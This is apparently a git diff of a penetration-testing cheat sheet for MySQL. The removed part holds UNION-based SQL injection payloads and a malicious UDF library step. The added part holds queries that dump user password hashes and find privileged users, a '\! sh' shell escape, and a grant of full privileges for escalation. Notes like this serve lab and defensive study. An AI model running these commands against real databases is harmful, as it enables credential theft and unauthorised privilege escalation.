@@ -1,53 +1,56 @@
 # MySQL 
-## Structure
-```
-information_schema              Metadata and all the databases and tables
-information_schema.schemata     Databases
-information_schema.tables       Tables
-information_schema.columns      Columns
+
+## Connection
+```sh
+mysql -u <hostname> -u root
+mysql -u <hostname> -u root@localhost
 ```
 
-### Example commands
+## Enumeration
 ```sql
--- Databases
-SELECT group_concat(schema_name), FROM information_schema.schemata;
+-- Version
+SELECT version();
+SELECT @@version();
 
--- Tables from DB
-SELECT group_concat(table_name), FROM information_schema.tables WHERE table_schema='YOURDB';
+-- User
+SELECT user();
 
--- Columns from table
-SELECT group_concat(column_name),FROM information_schema.columns WHERE table_name='TABLENAME';
+-- Get users, permissions and hahes
+SELECT * FROM mysql.user;
 
--- Get data
-SELECT data,data, FROM database.table;
+-- Permission
+SHOW GRANTS;
+SHOW GRANTS FOR "root"@"localhost";
+SHOW GRANTS FOR CURRENT_USER();
+
+-- From DB
+SELECT * FROM mysql.user WHERE user="root"; 
+
+-- Get users with file_priv
+SELECT user,file_priv FROM mysql.user WHERE file_priv="Y";
+
+-- Get users with Super_priv
+SELECT user,Super_priv FROM mysql.user WHERE Super_priv="Y";
+
+-- Database Name
+SELECT database();
+
+-- List functions
+SELECT routine_name FROM information_schema.routines WHERE routine_type = "FUNCTION";
+
+-- @Functions not from sys. db
+SELECT routine_name FROM information_schema.routines WHERE routine_type = "FUNCTION" AND routine_schema != "sys";
+
+-- Get databases
+SHOW databases;
+
+-- Get shell
+\! sh
 ```
 
-## Queries
-### UNION
-When an application is vulnerable to SQL injection and the results of the query are returned within the application’s responses, the UNION keyword can be used to retrieve data from other tables within the database. This results in an SQL injection UNION attack.
-
-#### Examples
+## Privilege Escalation
+### Create user and give privileges
 ```sql
--- If values are returned in order
-SELECT a, b FROM table1 UNION SELECT c, d FROM table2
-
--- If more than one entry is returned but not all of the are in use
-SELECT 1, group_concat(schema_name), 3, 4, 5, 6, 7 from information_schema.schemata;-- -
-```
-
-#### References
-- [https://medium.com/@nyomanpradipta120/sql-injection-union-attack-9c10de1a5635](https://medium.com/@nyomanpradipta120/sql-injection-union-attack-9c10de1a5635)
-
-
-## Functions
-### User-Defined function
-Basic example, the functions takes a given number as a parameter and returns that number.
-```sql
-CREATE FUNCTION sql_function(random_num integer) RETURNS integer random_num;
-```
-
-The following example was written for a HTB machine, it stores a malicious `.so` file.     
-**[DEMO](https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf)**
-```sql
-CREATE FUNCTION do_system RETURNS integer soname 'raptor_udf2.so';
+CREATE USER test identified BY "test";
+GRANT SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by "mysql" WITH GRANT OPTION;
 ```
